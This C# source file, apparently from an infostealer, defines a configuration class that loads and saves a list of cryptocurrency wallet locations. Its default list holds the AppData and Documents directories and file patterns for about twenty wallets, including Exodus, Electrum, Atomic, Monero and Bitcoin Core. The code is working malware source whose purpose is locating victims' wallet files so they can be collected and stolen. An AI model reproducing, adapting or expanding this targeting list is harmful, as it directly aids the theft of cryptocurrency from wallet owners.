using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using System;
using System.Collections.Generic;
using System.IO;

namespace Meta.SharedModels;

public class WalletConfigsDb
{
    public static object RootLocker = new object();

    public List<WalletConfig> walletSettings = new List<WalletConfig>();

    private string SettingsFile => "walletParserConfig.json";

    public void LoadSettings()
    {
        try
        {
            if (File.Exists(SettingsFile))
            {
                string text = File.ReadAllText(SettingsFile);
                if (string.IsNullOrWhiteSpace(text))
                {
                    return;
                }
                JArray jArray = JArray.Parse(text);
                walletSettings = jArray.ToObject<List<WalletConfig>>();
                if (walletSettings == null)
                {
                    SetDefault();
                    SaveSettings();
                }
                if (walletSettings.Count == 0)
                {
                    SetDefault();
                    SaveSettings();
                }
                bool flag = false;
                foreach (WalletConfig walletSetting in walletSettings)
                {
                    if (string.IsNullOrWhiteSpace(walletSetting.Name))
                    {
                        flag = true;
                        break;
                    }
                }
                if (flag)
                {
                    SetDefault();
                    SaveSettings();
                }
            }
            else
            {
                SetDefault();
                SaveSettings();
            }
        }
        catch (Exception)
        {
            SetDefault();
            SaveSettings();
        }
    }

    public void SaveSettings()
    {
        string contents = JsonConvert.SerializeObject(walletSettings, Formatting.Indented);
        File.WriteAllText(SettingsFile, contents);
    }

    public void SetDefault()
    {
        walletSettings = new List<WalletConfig>
        {
            new WalletConfig
            {
                Name = "Armory",
                RootDir = "%appdata%",
                ScannerArgs = new List<FileScannerArg>
                {
                    new FileScannerArg
                    {
                        Directory = "Armory",
                        Pattern = "*.wallet",
                        Recoursive = false
                    }
                }
            },
            new WalletConfig
            {
                Name = "Atomic",
                RootDir = "%appdata%",
                ScannerArgs = new List<FileScannerArg>
                {
                    new FileScannerArg
                    {
                        Directory = "atomic",
                        Pattern = "*",
                        Recoursive = true
                    }
                }
            },
            new WalletConfig
            {
                Name = "Binance",
                RootDir = "%appdata%",
                ScannerArgs = new List<FileScannerArg>
                {
                    new FileScannerArg
                    {
                        Directory = "Binance",
                        Pattern = "*app-store*",
                        Recoursive = false
                    }
                }
            },
            new WalletConfig
            {
                Name = "Coinomi",
                RootDir = "%localappdata%",
                ScannerArgs = new List<FileScannerArg>
                {
                    new FileScannerArg
                    {
                        Directory = "Coinomi\\Coinomi\\Cache",
                        Pattern = "*",
                        Recoursive = true
                    },
                    new FileScannerArg
                    {
                        Directory = "Coinomi\\Coinomi\\db",
                        Pattern = "*",
                        Recoursive = true
                    },
                    new FileScannerArg
                    {
                        Directory = "Coinomi\\Coinomi\\wallets",
                        Pattern = "*",
                        Recoursive = true
                    }
                }
            },
            new WalletConfig
            {
                Name = "Electrum",
                RootDir = "%appdata%",
                ScannerArgs = new List<FileScannerArg>
                {
                    new FileScannerArg
                    {
                        Directory = "Electrum\\wallets",
                        Pattern = "*",
                        Recoursive = false
                    }
                }
            },
            new WalletConfig
            {
                Name = "Ethereum",
                RootDir = "%appdata%",
                ScannerArgs = new List<FileScannerArg>
                {
                    new FileScannerArg
                    {
                        Directory = "Ethereum\\wallets",
                        Pattern = "*",
                        Recoursive = false
                    }
                }
            },
            new WalletConfig
            {
                Name = "Exodus",
                RootDir = "%appdata%",
                ScannerArgs = new List<FileScannerArg>
                {
                    new FileScannerArg
                    {
                        Directory = "Exodus\\exodus.wallet",
                        Pattern = "*",
                        Recoursive = false
                    },
                    new FileScannerArg
                    {
                        Directory = "Exodus",
                        Pattern = "*.json",
                        Recoursive = false
                    }
                }
            },
            new WalletConfig
            {
                Name = "Guarda",
                RootDir = "%appdata%",
                ScannerArgs = new List<FileScannerArg>
                {
                    new FileScannerArg
                    {
                        Directory = "Guarda",
                        Pattern = "*",
                        Recoursive = true
                    }
                }
            },
            new WalletConfig
            {
                Name = "Jaxx",
                RootDir = "%appdata%",
                ScannerArgs = new List<FileScannerArg>
                {
                    new FileScannerArg
                    {
                        Directory = "com.liberty.jaxx",
                        Pattern = "*",
                        Recoursive = true
                    }
                }
            },
            new WalletConfig
            {
                Name = "Monero",
                RootDir = "%userprofile%\\Documents",
                ScannerArgs = new List<FileScannerArg>
                {
                    new FileScannerArg
                    {
                        Directory = "Monero\\wallets",
                        Pattern = "*",
                        Recoursive = false
                    }
                }
            },
            new WalletConfig
            {
                Name = "WalletWasabi",
                RootDir = "%appdata%",
                ScannerArgs = new List<FileScannerArg>
                {
                    new FileScannerArg
                    {
                        Directory = "WalletWasabi\\Client\\Wallets",
                        Pattern = "*",
                        Recoursive = true
                    }
                }
            },
            new WalletConfig
            {
                Name = "BlockStream",
                RootDir = "%localappdata%",
                ScannerArgs = new List<FileScannerArg>
                {
                    new FileScannerArg
                    {
                        Directory = "Blockstream\\Green\\wallets",
                        Pattern = "*",
                        Recoursive = true
                    }
                }
            },
            new WalletConfig
            {
                Name = "InfinityWallet",
                RootDir = "%appdata%",
                ScannerArgs = new List<FileScannerArg>
                {
                    new FileScannerArg
                    {
                        Directory = "InfinityWallet",
                        Pattern = "*",
                        Recoursive = true
                    }
                }
            },
            new WalletConfig
            {
                Name = "Daedalus",
                RootDir = "%appdata%",
                ScannerArgs = new List<FileScannerArg>
                {
                    new FileScannerArg
                    {
                        Directory = "Daedalus Mainnet\\wallets",
                        Pattern = "*.sqlite",
                        Recoursive = true
                    }
                }
            },
            new WalletConfig
            {
                Name = "MyMonero",
                RootDir = "%appdata%",
                ScannerArgs = new List<FileScannerArg>
                {
                    new FileScannerArg
                    {
                        Directory = "MyMonero",
                        Pattern = "*",
                        Recoursive = true
                    }
                }
            },
            new WalletConfig
            {
                Name = "Coin Wallet",
                RootDir = "%appdata%",
                ScannerArgs = new List<FileScannerArg>
                {
                    new FileScannerArg
                    {
                        Directory = "Coin Wallet\\Local Storage\\leveldb",
                        Pattern = "*",
                        Recoursive = true
                    }
                }
            },
            new WalletConfig
            {
                Name = "Zap wallet",
                RootDir = "%appdata%",
                ScannerArgs = new List<FileScannerArg>
                {
                    new FileScannerArg
                    {
                        Directory = "Zap\\Local Storage\\leveldb",
                        Pattern = "*",
                        Recoursive = true
                    }
                }
            },
            new WalletConfig
            {
                Name = "Neon wallet",
                RootDir = "%appdata%",
                ScannerArgs = new List<FileScannerArg>
                {
                    new FileScannerArg
                    {
                        Directory = "Neon\\storage",
                        Pattern = "*",
                        Recoursive = true
                    }
                }
            },
            new WalletConfig
            {
                Name = "Bitcoin Core",
                RootDir = "%appdata%",
                ScannerArgs = new List<FileScannerArg>
                {
                    new FileScannerArg
                    {
                        Directory = "Bitcoin\\wallets",
                        Pattern = "*",
                        Recoursive = true
                    }
                }
            },
            new WalletConfig
            {
                Name = "ElectronCash",
                RootDir = "%appdata%",
                ScannerArgs = new List<FileScannerArg>
                {
                    new FileScannerArg
                    {
                        Directory = "ElectronCash\\wallets",
                        Pattern = "*",
                        Recoursive = true
                    }
                }
            },
            new WalletConfig
            {
                Name = "Electrum-LTC",
                RootDir = "%appdata%",
                ScannerArgs = new List<FileScannerArg>
                {
                    new FileScannerArg
                    {
                        Directory = "Electrum-LTC\\wallets",
                        Pattern = "*",
                        Recoursive = true
                    }
                }
            },
            new WalletConfig
            {
                Name = "Litecoin core",
                RootDir = "%appdata%",
                ScannerArgs = new List<FileScannerArg>
                {
                    new FileScannerArg
                    {
                        Directory = "Litecoin\\wallets",
                        Pattern = "*",
                        Recoursive = true
                    }
                }
            }
        };
    }
}
